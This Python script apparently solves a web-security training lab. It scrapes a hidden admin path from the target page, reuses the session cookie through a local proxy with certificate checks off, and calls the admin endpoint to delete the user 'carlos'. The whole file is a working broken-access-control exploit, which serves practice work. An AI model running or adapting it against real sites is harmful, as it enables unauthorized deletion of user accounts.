
import requests as rs
import sys
import urllib3
from bs4 import BeautifulSoup as bs
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
  'http':'http://127.0.0.1:8080',
  'https':'http://127.0.0.1:8080'
}


def delete_usr(url):
  r = rs.get(url,verify=False,proxies=proxies)

  # retrieve session  cookie
  session_cookie = r.cookies.get_dict().get('session')

  # Retrieve the admin path
  soup = bs(r.text,'lxml')
  admin_instance = soup.find(string=re.compile('/admin-'))
  admin_path = re.search("href', '(.*)'", admin_instance).group(1)
  print(admin_path)

  # Delete Carlos User
  cookies = {'session':session_cookie}
  delete_carlos_url = url + admin_path + '/delete?username=carlos'
  r = rs.get(delete_carlos_url,cookies=cookies,verify=False,proxies=proxies)
  if r.status_code == 200:
    print("Carlos user delete.............<<<")

  else:
    sys.stdout.write("[-] Process Failed....")
    sys.stdout.write(">>> Exit Program <<<")
    sys.exit(-1)


def main():
  if len(sys.argv) != 2:
    print("[+] Usage %s <url>" % sys.argv[0])
    sys.exit(-1)

  url = sys.argv[1]
  sys.stdout.write("Deleting Carlos user..")
  delete_usr(url)


if __name__ == "__main__":
    main()
